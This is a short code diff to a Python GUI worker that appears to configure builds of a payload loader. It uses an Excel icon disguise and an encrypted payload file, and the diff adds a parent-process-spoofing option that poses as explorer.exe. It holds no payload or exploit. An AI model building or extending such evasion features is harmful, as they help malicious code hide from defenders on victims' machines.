@@ -95,6 +95,9 @@ class WorkerThread(QThread):
         
         env_vars['RSL_ICON_PATH'] = self.params.get('icon_path', 'icons/excel.ico')
         
+        if self.params.get('enable_ppid_spoofing', False):
+            env_vars['RSL_PARENT_PROCESS_NAME'] = self.params.get('parent_process_name', 'explorer.exe')
+        
         if self.params.get('load_payload_mode') == 'cmdline':
             default_address = self.params.get('default_payload_address', 'encrypt.bin')
             if default_address.strip():  # Ensure not empty
@@ -185,13 +188,16 @@ class WorkerThread(QThread):
                 features.append(syscall_feature)
         
         if self.params.get('forgery_enable'):
-            features.append('with_forgery')
+            features.append('with_bundling')
         
         if self.params.get('win7_compat', False):
             features.append('win7')
         
         if self.params.get('debug_mode', False):
             features.append('debug')
+        
+        if self.params.get('enable_ppid_spoofing', False):
+            features.append('ppid_spoofing')
         
         return features
 
